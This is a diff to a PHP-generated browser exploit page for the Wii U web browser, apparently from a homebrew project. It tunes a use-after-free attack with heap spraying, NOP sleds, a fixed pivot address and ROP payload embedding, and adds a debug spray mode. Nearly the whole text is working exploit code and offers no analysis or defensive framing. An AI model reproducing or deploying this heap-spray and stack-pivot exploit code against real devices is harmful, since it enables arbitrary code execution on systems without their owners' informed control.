@@ -12,18 +12,19 @@ function hexentities($str) {
 $_REQUEST['sysver'] = '550'; // Currently hardcoded.
 $generatebinrop = 1; // Make sure the $ROPCHAIN will be in binary.
 
-$pivotAdress        = 0x010ADDCC; // don't change this.
-$payload_size       = 0x20000; // the codegen is 128kb max.
-$pivotAdressAdress  = 0x1B800000; // where does this come from? Seems to be stable with the current spraying
+$pivotAdress            = 0x010ADDCC; // don't change this.
+$payload_size_w_nops    = 0x20000; // the codegen is 128kb max.
+$pivotAdressAdress      = 0x1B800000; // where does this come from? Seems to be stable with the current spraying
 
 // These values could be adjusted to increase success rate.
-$payload_srcaddr    = 0x1D500000 - 0x00A10000;
-$payload_spray_size = 0x400000;
+$payload_srcaddr        = 0x1D500000 - 0x00A10000;
+$payload_spray_size     = 0x400000;
 
-$ROPHEAP = $payload_srcaddr - 0x1000; //+ is a BAD idea as is may override our payload
+$ROPHEAP                = $payload_srcaddr - 0x1000; //+ is a BAD idea as is may override our payload
 
 $ropchainselect = 1; // Put codebin on heap and search it.
 //$ropchainselect = 2; // Put codebin into ROP (Only works with reaaaaaally small payloads.
+//$ropchainselect = 3; // Print string at payload_srcaddr. 
 
 /**
  Expects a wiiuhaxx_common_cfg.php with the following variables
@@ -48,15 +49,15 @@ function UaF(a){
     var pivotAdress             = <?php echo $pivotAdress ?>;
     //5.5.2
     {
-        var pivotAdressAdress       = <?php echo $pivotAdressAdress ?>; //r6
-        var payloadAdress           = <?php echo $payload_srcaddr ?> + delta;
+        var pivotAdressAdress   = <?php echo $pivotAdressAdress ?>; //r6
+        var payloadAdress       = <?php echo $payload_srcaddr ?> + delta;
     }
 
     var codegenAddress          = 0x01800000; // don't change this.
     var sizeWebCoreImageLoader  = 0x18;       // don't change this.
     
-    var payloadsize             = <?php echo $payload_size; ?>;
-    var sprayCount              = <?php echo $payload_spray_size; ?>/payloadsize;
+    var payloadsizeWithNOPs     = <?php echo $payload_size_w_nops; ?>;
+    var sprayCount              = <?php echo $payload_spray_size; ?>/payloadsizeWithNOPs;
     var _4K                     = 0x1000;
     var _16K                    = 0x4000;
     var _32K                    = 0x8000;
@@ -114,27 +115,68 @@ function UaF(a){
             ropCurrentOffset += 1;
         });
     }
-
+     
     //Spray final payload
-    //Middle range 0x1C9E0000
+       
+    <?php if($ropchainselect != 3) echo "/*" ?>
+    
+    // little helper function.
+    function toHex(str) {
+        var hex = '';
+        for(var i=0;i<str.length;i++) {
+            hex += ''+str.charCodeAt(i).toString(16);
+        }
+        return hex;
+    }
+
+    fillerID = 0;
+    var expected_payloadsize = 0x4000; // ~ the size of the HBL payload.
     var ar2 = new Array(sprayCount);
     for(var i=0; i<sprayCount; i++){
-         ar2[i] = new Uint8Array(
-             <?php
-            $payload = wiiuhaxx_generatepayload();
-            // Place a bunch of nops before our actual payload so the total size is 0x4000 bytes.
-            echo "[";
-            for($iNop = 0;$iNop<(0x4000-strlen($payload))/4;$iNop++){
-                echo " 0x60, 0x00, 0x00, 0x00,"; // nop
+        ar2[i] = new DataView(new ArrayBuffer(payloadsizeWithNOPs));
+        var curOffset = 0;
+        
+        for(var curNopI =0;curNopI < (payloadsizeWithNOPs) /8;curNopI++){                
+            var str = toHex(fillerID.toString(16)) + "00";                
+            while(str.length < 0x10){
+                if(curNopI > (payloadsizeWithNOPs - expected_payloadsize)/8){
+                    // if the string begins with "_" it would have collided with ourpayload
+                    str = "5F" + str;
+                }else{
+                    // if the string begins with "." everything would be okay.
+                    str = "2E" + str;
+                }
             }
-            echo hexentities($payload) . "]";
-            ?>
-         );        
+            
+            ar2[i].setUint32(curOffset,parseInt(str.substr(0,8),16));
+            ar2[i].setUint32(curOffset+4,parseInt(str.substr(8,8),16));
+            curOffset += 8;
+            fillerID +=8;   
+        }
     }
     
-
-    //alert("wait...");
-
+    <?php if($ropchainselect != 3) echo "*/" ?>
+    <?php if($ropchainselect == 3) echo "/*" ?>
+    
+    <?php echo "var payload= [" . hexentities(wiiuhaxx_generatepayload()) . "];"; ?>
+    var ar2 = new Array(sprayCount);
+    for(var i=0; i<sprayCount; i++){
+        ar2[i] = new DataView(new ArrayBuffer(payloadsizeWithNOPs));
+    }
+    for(var i=0; i<sprayCount; i++){
+        var curOffset = 0;
+        
+        for(var curNopI =0;curNopI < (payloadsizeWithNOPs - payload.length) / 4;curNopI++){                
+            ar2[i].setUint32(curOffset,0x60000000); // nop
+            curOffset += 4; 
+        }
+        
+        for(var curI = 0; curI< payload.length;curI++){
+            ar2[i].setUint8(curOffset++,payload[curI]);
+        }
+    }
+    <?php if($ropchainselect == 3) echo "*/" ?>
+        
     //Use the new WebCore::ImageLoader & pivot !
     return 0;
 }
